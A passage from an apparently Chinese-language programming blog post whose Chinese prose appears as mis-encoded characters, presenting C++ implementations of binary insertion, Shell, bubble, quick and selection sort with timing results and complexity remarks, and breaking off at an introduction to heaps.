class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container&gt;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">binaryInsertionSort</span><span class="params">(Container&amp; container)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span> first = std::<span class="built_in">begin</span>(container);</span><br><span class="line"><span class="keyword">auto</span> end = std::<span class="built_in">end</span>(container);</span><br><span class="line"><span class="keyword">if</span> (first == end) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = std::<span class="built_in">next</span>(first); i != end; ++i) &#123;</span><br><span class="line"><span class="keyword">auto</span> high = i;</span><br><span class="line"><span class="keyword">auto</span> low = first;</span><br><span class="line"><span class="keyword">auto</span> mid = first;</span><br><span class="line"><span class="keyword">auto</span> tmp = *i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">mid = low;</span><br><span class="line">std::<span class="built_in">advance</span>(mid, std::<span class="built_in">distance</span>(low, high) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (*mid &lt; tmp) &#123;</span><br><span class="line">low = std::<span class="built_in">next</span>(mid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">high = mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> j = i; j &gt; low; --j) &#123;</span><br><span class="line">*j = *std::<span class="built_in">prev</span>(j);</span><br><span class="line">&#125;</span><br><span class="line">*low = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00054250</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">5</span>.<span class="number">42496460</span></span><br></pre></td></tr></table></figure><p>æˆ‘å¤šè¯•äº†å‡ æ¬¡(20é•¿åº¦)ï¼Œå‘ç°æ¯”ç›´æ¥æ’å…¥çš„é€Ÿåº¦æ…¢ï¼Œéš¾é“æ˜¯æˆ‘å†™é”™äº†ï¼ŸQAQï¼Œå¯èƒ½æ˜¯ç®—æ³•å¤ªèœäº†ã€‚</p><p>å¤–å¾ªç¯$O(n)$ï¼Œå†…å¾ªç¯æŸ¥æ‰¾+æ’å…¥$O(log_2n)+O(n)$ï¼Œæ‰€ä»¥æ€»ä½“æ—¶é—´å¤æ‚åº¦ï¼š$O(nlog_2n)+O(n^2)=O(n^2)$ï¼Œå¯¹äºæœ€å¥½æ—¶é—´ï¼Œå·²æ’åºå®Œæˆï¼Œ$O(n)$ï¼Œæœ€å·®æ—¶é—´ï¼Œå€’åº$O(n^2)$</p><p>è¿™ä¹ˆä¸€çœ‹åœ¨nå°æ—¶ç”¨ç›´æ¥æ’å…¥ï¼Œnå¤§æ—¶ç”¨äºŒåˆ†æ’å…¥æ›´å¥½ã€‚<br>å¯¹äºç©ºé—´å¤æ‚åº¦ï¼Œç”±äºæœ‰4ä¸ªé¢å¤–ç©ºé—´ï¼Œæ‰€ä»¥æ˜¯$O(4)$</p><h2 id="å¸Œå°”æ’åº">å¸Œå°”æ’åº</h2><p>åˆå«ç¼©å°å¢é‡æ’åºã€‚ç›´æ¥æ’å…¥æ’åºæœ‰ä¸¤ä¸ªæ€§è´¨ï¼Œåœ¨å¿«æ’åºå¥½æ—¶ï¼Œæ•ˆç‡é«˜ï¼Œå¤§æ¦‚èƒ½åˆ°O(n)ï¼Œä½†æ˜¯æ’å…¥æ“ä½œååˆ†ä½æ•ˆå› ä¸ºæ¯æ¬¡éƒ½åªèƒ½ç§»åŠ¨ä¸€ä½ã€‚æ‰€ä»¥å¸Œå°”æ’åºå…ˆåˆ’åˆ†å°å—åˆ†åˆ«æ’å…¥æ’åºï¼Œç„¶åå†æ€»ä½“æ’å…¥æ’åºã€‚</p><p>é‚£ä¹ˆé€‰å–Hï¼Œå³é—´éš”å°±å¾ˆé‡è¦äº†ï¼Œè¿™é‡Œæœ‰ä¸¤ç¯‡æ–‡ç« </p><p><a href="https://oi-wiki.org/basic/shell-sort/">å¸Œå°”æ’åº - OI Wiki</a><br><a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F#.E6.AD.A5.E9.95.BF.E5.BA.8F.E5.88.97">å¸Œå°”æ’åº - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></p><p>éƒ½æåˆ°äº†æ¯”è¾ƒå¥½çš„Hé€‰æ‹©ï¼Œå› ä¸ºSedgewickæ­¥é•¿æœ‰ç‚¹ä¸å¥½å†™ï¼Œè¿™é‡Œç›´æ¥å°±ç”¨åŸä½œè€…çš„æ’åº</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">shellSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">std::deque&lt;<span class="type">int</span>&gt; gap = &#123;&#125;;</span><br><span class="line"><span class="keyword">auto</span> gapinit = [&amp;gap](<span class="type">int</span> len, <span class="keyword">auto</span> function)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">function</span>(i);</span><br><span class="line"><span class="keyword">if</span> (x &gt; len)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">gap.<span class="built_in">insert</span>(gap.<span class="built_in">begin</span>(), x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> sort = [](<span class="type">int</span> arr[], <span class="type">int</span> gap, <span class="type">const</span> <span class="type">int</span> len) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = gap; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = i;</span><br><span class="line"><span class="keyword">auto</span> tmp = arr[i];<span class="comment">//é˜²æ­¢j=iæ—¶arr[i]è¢«ä¿®æ”¹</span></span><br><span class="line"><span class="keyword">while</span> (j - gap &gt; <span class="number">0</span> &amp;&amp; arr[j - gap] &gt; tmp) &#123;</span><br><span class="line">arr[j] = arr[j - gap];</span><br><span class="line">j -= gap;</span><br><span class="line">&#125;</span><br><span class="line">arr[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">gapinit</span>(len, [](<span class="type">int</span> i) &#123;</span><br><span class="line"><span class="built_in">return</span> (<span class="type">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> g : gap)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sort</span>(arr, g, len);</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container&gt;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">shellSort</span><span class="params">(Container&amp; arr)</span> </span>&#123;</span><br><span class="line">std::deque&lt;<span class="type">int</span>&gt;gap = &#123;&#125;;</span><br><span class="line"><span class="keyword">auto</span> first = std::<span class="built_in">begin</span>(arr);</span><br><span class="line"><span class="keyword">auto</span> end = std::<span class="built_in">end</span>(arr);</span><br><span class="line"><span class="keyword">auto</span> len = std::<span class="built_in">distance</span>(first, end);</span><br><span class="line"><span class="keyword">auto</span> gapinit = [&amp;gap](<span class="type">int</span> len, std::function&lt;<span class="built_in">int</span>(<span class="type">int</span>)&gt; func)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">func</span>(i);</span><br><span class="line"><span class="keyword">if</span> (x &gt; len)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">gap.<span class="built_in">insert</span>(gap.<span class="built_in">begin</span>(), x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> sort = [first, end](Container&amp; container, <span class="type">int</span> gap)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> len = std::<span class="built_in">distance</span>(first, end);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = gap; i &lt; len; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> tmp = (*(first + i));</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="keyword">for</span> (j = i; j &gt;= gap &amp;&amp; *(first + j - gap) &gt; tmp; j -= gap)</span><br><span class="line">&#123;</span><br><span class="line">*(first + j) = *(first + j - gap);</span><br><span class="line">&#125;</span><br><span class="line">*(first + j) = (tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">gapinit</span>(len, [](<span class="type">int</span> i) &#123;</span><br><span class="line"><span class="keyword">return</span> std::<span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> g : gap) &#123;</span><br><span class="line"><span class="built_in">sort</span>(arr, g);</span><br><span class="line"><span class="built_in">pArr</span>(arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¶é—´æµ‹è¯•</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00008865</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">0</span>.<span class="number">88646020</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œé€Ÿåº¦ç›¸è¾ƒä¹‹å‰çš„ä¸¤ä¸ªæå‡äº†5å€ä¸æ­¢ã€‚</p><p>å¯¹äºå¸Œå°”ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ï¼Œéœ€è¦é¢å¤–è€ƒè™‘gapçš„å€¼ï¼Œä¸åŒçš„å€¼å¯¹åº”ä¸åŒçš„å¤æ‚åº¦ï¼Œæ¯”å¦‚è¯´å¢é‡ä¸º2çš„å€æ•°ï¼Œé‚£ä¹ˆåŒä¸€ä¸ªç»„ä¸­2çš„å€æ•°ä¼šå¤šæ¬¡æ¯”è¾ƒï¼Œæ”¹æˆ<code>pow(3,i)</code>å</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00007897</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">0</span>.<span class="number">78967320</span></span><br></pre></td></tr></table></figure><p>å¾ˆç¨³å®šåœ°æé«˜äº†å¤§çº¦0.1sã€‚æ‰€ä»¥åªèƒ½è¯´å¤§è‡´æ¥çœ‹æ—¶é—´å¤æ‚åº¦åœ¨$O(nlog(n))$ï¼Œå¯¹äºä»¥2çš„å¹³æ–¹ä¸ºé—´éš”çš„ï¼Œåœ¨å®Œå…¨å€’åºçš„æƒ…å†µä¸‹æœ€å·®ä¼šé€€åŒ–åˆ°$O(n^2)$ã€‚æŸ¥èµ„æ–™çš„æ—¶å€™å‘ç°ï¼Œè¿™æ˜¯ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªçªç ´$O(n^2)$çš„æ’åºç®—æ³•ï¼ŒçœŸå¼ºã€‚<br>å¯¹äºç©ºé—´å¤æ‚åº¦ï¼Œç”±äºé¢å¤–å ç”¨ä¸€ä¸ªtmpï¼Œæ‰€ä»¥ä¸º$O(1)$</p><h1>äº¤æ¢æ’åº</h1><p>äº¤æ¢æ’åºæ˜¯æŒ‡è¿™ä¸€æ¬¡æ’åºçš„å…ƒç´ ä¸å…¶å®ƒå…ƒç´ äº¤æ¢æœ€åå®ç°çš„æ’åº</p><h2 id="å†’æ³¡æ’åº">å†’æ³¡æ’åº</h2><p>ç¨³å®šçš„æ’åº</p><p>ç»å…¸è€ç†Ÿäººï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç›´æ¥ä¸Šä»£ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bubbleSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = len; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">bool</span> sorted = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; j - <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &gt; arr[i + <span class="number">1</span>]) &#123;</span><br><span class="line">sorted = <span class="literal">false</span>;</span><br><span class="line">std::<span class="built_in">swap</span>(arr[i], arr[i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//pArr(arr, 20);</span></span><br><span class="line"><span class="keyword">if</span> (sorted)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container&gt;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bubbleSort</span><span class="params">(Container&amp; container)</span> </span>&#123;</span><br><span class="line"><span class="type">bool</span> sorted = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> end = std::<span class="built_in">end</span>(container); !sorted &amp;&amp; end != std::<span class="built_in">begin</span>(container); --end) &#123;</span><br><span class="line">sorted = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = std::<span class="built_in">begin</span>(container); std::<span class="built_in">next</span>(it) != end; ++it) &#123;</span><br><span class="line"><span class="keyword">if</span> (*it &gt; *std::<span class="built_in">next</span>(it)) &#123;</span><br><span class="line">std::<span class="built_in">swap</span>(*it, *std::<span class="built_in">next</span>(it));</span><br><span class="line">sorted = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">pArr</span>(container);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00132296</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">13</span>.<span class="number">22964510</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ…¢ï¼Œå¯èƒ½åªé€‚åˆå°æ•°ç»„ï¼Œå®šæ­»çš„ä¸¤é‡å¾ªç¯è®©å®ƒåªèƒ½åœ¨$O(n^2)$ä¸Šï¼Œé™¤äº†è¿æ°”å¾ˆå¥½åˆšå¥½æœ‰åºï¼Œåˆ™åªéœ€$O(n)$</p><p>ç©ºé—´å¤æ‚åº¦$O(1)$</p><h2 id="å¿«é€Ÿæ’åº">å¿«é€Ÿæ’åº</h2><p><s>é¡¾åæ€ä¹‰ï¼Œå¾ˆå¿«çš„æ’åº</s>ã€‚æ¯æ¬¡æ’åºæ—¶ï¼Œå®šä¹‰ä¸€ä¸ªåŸºå‡†å€¼ï¼ˆä¸€èˆ¬æ˜¯å¼€å¤´å…ƒç´ æˆ–ç»“å°¾å…ƒç´ ï¼‰ç„¶åä»å·¦å’Œå³åˆ†åˆ«å¼•å‡ºæŒ‡é’ˆï¼ŒåŸºå‡†è¿œç¦»çš„é‚£ä¸ªæŒ‡é’ˆå¼€å§‹å‘ä¸­å¿ƒç§»åŠ¨ï¼Œé‡åˆ°å°äºåŸºå‡†å€¼çš„å°±å¤åˆ¶åˆ°ç¦»åŸºå‡†è¿‘çš„ä½ç½®ï¼Œç„¶åè¿‘çš„æŒ‡é’ˆç§»åŠ¨æ‰¾å¤§äºåŸºå‡†å€¼çš„ï¼Œå¤åˆ¶åˆ°è¿œç¦»åŸºå‡†çš„æŒ‡é’ˆä½ç½®ï¼Œä¸¤ä¸ªæŒ‡é’ˆç›¸é‡åï¼Œå°†åŸºå‡†èµ‹å€¼åˆ°è¿™é‡Œã€‚ç„¶ååˆ†åˆ«å¯¹å·¦è¾¹å’Œå³è¾¹æ‰§è¡Œè¿™ä¸ªæ“ä½œã€‚å› æ­¤è¦ä½¿ç”¨é€’å½’ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">quickSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">di</span> &#123;</span><br><span class="line">left,</span><br><span class="line">right</span><br><span class="line">&#125;;</span><br><span class="line">std::function&lt;<span class="type">void</span>(<span class="type">int</span>, <span class="type">int</span>)&gt; sort;</span><br><span class="line">sort = [&amp;arr, &amp;sort](<span class="type">int</span> is, <span class="type">int</span> ie) &#123;</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">if</span> (is == ie)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (is + <span class="number">1</span> == ie) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[is] &gt; arr[ie])</span><br><span class="line">std::<span class="built_in">swap</span>(arr[is], arr[ie]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">di diriction = right;</span><br><span class="line"><span class="type">int</span> ieb = ie;</span><br><span class="line"><span class="type">int</span> isb = is;</span><br><span class="line"><span class="keyword">auto</span> base = arr[is];</span><br><span class="line"><span class="keyword">while</span> (is &lt; ie) &#123;</span><br><span class="line"><span class="keyword">if</span> (diriction == right) &#123;</span><br><span class="line"><span class="keyword">while</span> (base &lt;= arr[ie] &amp;&amp; is &lt; ie)</span><br><span class="line">ie--;</span><br><span class="line">arr[is] = arr[ie];</span><br><span class="line">diriction = left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (base &gt; arr[is] &amp;&amp; is &lt; ie)</span><br><span class="line">&#123;</span><br><span class="line">is++;</span><br><span class="line">&#125;</span><br><span class="line">arr[ie] = arr[is];</span><br><span class="line">diriction = right;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">arr[is] = base;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; base &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">if</span> (is &gt; isb)</span><br><span class="line"><span class="built_in">sort</span>(isb, is - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (is &lt; ieb)</span><br><span class="line"><span class="built_in">sort</span>(is + <span class="number">1</span>, ieb);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">sort</span>(<span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢å°±ä¸å†™æ¨¡æ¿äº†QAQ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00006714</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">0</span>.<span class="number">67141270</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºç¡®å®å¾ˆå¿«ï¼Œæ¯”å¸Œå°”åˆå°‘äº†0.1så·¦å³ã€‚ç”±äºæ¯æ¬¡æ˜¯æŠ˜åŠ,æ‰€ä»¥é€Ÿåº¦æ˜¯$O(nlog(n))$ï¼Œæœ€åæƒ…å†µä¸‹ï¼Œæ¯æ¬¡çš„æ¢è½´æ˜¯æœ€å¤§å€¼æˆ–æœ€å°‘å€¼ï¼Œç›¸å½“äºäºŒå‰æ ‘é€€åŒ–ä¸ºé“¾è¡¨ï¼Œæ‰€ä»¥æ˜¯$O(n^2)$å¯¹åº”çš„ï¼Œç”±äºæœ‰æŠ˜åŠæ¬¡çš„é€’å½’ï¼Œæ‰€ä»¥ç©ºé—´å¤æ‚åº¦æ˜¯$O(logn)$</p><h1>é€‰æ‹©æ’åº</h1><h2 id="ç®€å•é€‰æ‹©æ’åº">ç®€å•é€‰æ‹©æ’åº</h2><p>æ¯æ¬¡å¾ªç¯æ—¶é€‰æ‹©ä¸€ä¸ªæœ€å°çš„æ•°ï¼Œå’Œå½“å‰è½®æ¬¡içš„å…ƒç´ äº¤æ¢</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">selectSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index = i;</span><br><span class="line"><span class="type">int</span> min = arr[i];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; len; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (min &gt; arr[j]) &#123;</span><br><span class="line">min = arr[j];</span><br><span class="line">index = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">std::<span class="built_in">swap</span>(arr[i], arr[index]);</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00045653</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">4</span>.<span class="number">56533570</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé€Ÿåº¦æ¯”ç›´æ¥æ’å…¥å¿«ï¼Œæˆ‘è§‰å¾—æ˜¯å› ä¸ºæ²¡æœ‰æ‰§è¡Œå¤šè½®çš„ç§»åŠ¨å…ƒç´ ï¼Œæ˜¯å†’æ³¡çš„æ”¹è‰¯ï¼Œä½†æ˜¯æ—¶é—´å¤æ‚åº¦è¿˜æ˜¯åœ¨$O(n^2)$ï¼Œç©ºé—´å¤æ‚åº¦$O(1)$ï¼Œæœ‰é¢å¤–çš„2ä¸ªç©ºé—´ä½¿ç”¨ã€‚</p><h2 id="æ ‘å½¢é€‰æ‹©æ’åº">æ ‘å½¢é€‰æ‹©æ’åº</h2><h2 id="å †æ’åº">å †æ’åº</h2><p>ç”±äºæˆ‘ä¸ä¼šå †ï¼Œæ‰€ä»¥è¿™é‡Œå…ˆè¯´å †çš„æ¦‚å¿µ</p><h3 id="ä¼˜å…ˆé˜Ÿåˆ—">ä¼˜å…ˆé˜Ÿåˆ—</h3><p>ä¼˜å…ˆé˜Ÿåˆ—æ˜¯æŒ‡ä¸€ä¸ªé˜Ÿåˆ—ä¸æŒ‰æ¥çš„é¡ºåºå‡ºé˜Ÿï¼Œè€Œæ˜¯æ ¹æ®ä¼˜å…ˆçº§çš„é¡ºåºå‡ºé˜Ÿï¼Œè¿™å°±æ˜¯ä¼˜å…ˆé˜Ÿåˆ—ï¼Œ<br>å‡è®¾æŒ‰a,b,cçš„é¡ºåºå…¥é˜Ÿï¼Œä¼˜å…ˆçº§åˆ†åˆ«ä¸º1,3,2ï¼Œå¦‚æœæŒ‰ä¼˜å…ˆçº§é«˜çš„å…ˆå‡ºï¼Œå‡ºé˜Ÿé¡ºåºä¸ºb,c,aã€‚å¯ä»¥çœ‹å‡ºä¸ºäº†å­˜å‚¨nä¸ªå…ƒç´ 